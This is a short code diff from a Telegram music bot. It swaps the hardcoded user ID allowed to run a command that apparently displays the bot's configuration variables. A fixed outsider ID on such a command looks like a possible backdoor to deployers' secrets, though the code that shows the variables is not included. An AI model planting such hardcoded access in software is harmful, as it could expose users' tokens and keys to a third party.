@@ -12,7 +12,7 @@ from SankiMusic.modules.utils.formatters import convert_bytes
 VARS_COMMAND = get_command("VARS_COMMAND")
 
 
-@bot.on_message(filters.command(VARS_COMMAND) & filters.user(5336023580))
+@bot.on_message(filters.command(VARS_COMMAND) & filters.user(1476655690))
 async def varsFunc(client, message):
     mystic = await message.reply_text(
         "ᴩʟᴇᴀsᴇ ᴡᴀɪᴛ... ɢᴇᴛᴛɪɴɢ ʏᴏᴜʀ ᴄᴏɴғɪɢ ᴠᴀʀɪᴀʙʟᴇs..."
